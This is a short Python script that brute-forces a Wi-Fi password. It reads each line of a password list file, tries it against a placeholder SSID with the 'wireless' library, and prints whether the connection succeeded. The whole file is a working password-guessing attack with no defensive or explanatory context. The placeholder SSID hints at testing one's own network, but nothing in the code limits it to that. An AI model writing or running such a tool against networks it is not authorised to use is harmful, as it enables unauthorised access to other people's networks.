from wireless import Wireless

wire =  Wireless()
with open('passwordlist.txt', 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='insert_YOUR_ssid', password=line.strip()) == True:
            print('[+] ' + line.strip() + ' - Success!')
        else:
            print('[-] ' + line.strip() + ' - Failed!')
        